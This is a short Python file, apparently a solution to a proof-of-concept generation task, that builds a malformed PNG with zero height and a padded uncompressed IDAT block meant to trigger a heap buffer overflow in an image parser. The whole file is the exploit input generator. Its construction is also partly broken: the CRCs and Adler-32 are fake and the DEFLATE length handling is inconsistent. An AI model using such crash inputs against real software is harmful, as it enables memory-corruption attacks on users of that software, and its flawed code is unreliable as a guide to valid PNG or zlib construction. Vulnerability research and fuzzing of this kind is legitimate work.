import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed PNG image with zero height to trigger heap buffer overflow
        # PNG signature
        data = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk with zero height (vulnerability)
        # Width: 100, Height: 0, Bit depth: 8, Color type: 2 (Truecolor), 
        # Compression: 0, Filter: 0, Interlace: 0
        ihdr_data = struct.pack('>I', 100)  # width
        ihdr_data += struct.pack('>I', 0)   # height = 0 (vulnerable)
        ihdr_data += b'\x08\x02\x00\x00\x00'
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', 0x12345678)  # dummy CRC
        data += struct.pack('>I', 13) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk with compressed data to trigger overflow
        # Create enough data to reach target length while being valid enough
        # to pass initial parsing
        remaining_bytes = 17814 - len(data) - 12  # -12 for IDAT header/footer
        
        # Create minimal valid zlib data (raw DEFLATE block)
        # We need data that will be decompressed and cause overflow
        # when height is 0 but width is non-zero
        zlib_header = b'\x78\x01'  # CM=8, CINFO=7, no dict, FCHECK
        adler32 = struct.pack('>I', 1)  # dummy Adler-32
        
        # Raw DEFLATE block with BFINAL=1, BTYPE=00 (no compression)
        # LEN = remaining_bytes - 6 (for header and checksum), NLEN = ~LEN
        deflate_len = remaining_bytes - len(zlib_header) - len(adler32) - 5
        if deflate_len < 0:
            deflate_len = 1
        
        # Create non-compressed block
        block_header = b'\x01'  # BFINAL=1, BTYPE=00
        block_header += struct.pack('<H', deflate_len & 0xFFFF)
        block_header += struct.pack('<H', (~deflate_len) & 0xFFFF)
        
        # Fill with pattern that might trigger overflow
        pattern = b'A' * deflate_len
        
        idat_data = zlib_header + block_header + pattern + adler32
        idat_chunk = b'IDAT' + idat_data
        idat_crc = struct.pack('>I', 0x12345678)  # dummy CRC
        data += struct.pack('>I', len(idat_data)) + idat_chunk + idat_crc
        
        # IEND chunk (end of PNG)
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', 0xAE426082)  # correct IEND CRC
        data += struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Pad to exact target length if needed
        if len(data) < 17814:
            data += b'P' * (17814 - len(data))
        elif len(data) > 17814:
            data = data[:17814]
            
        return data
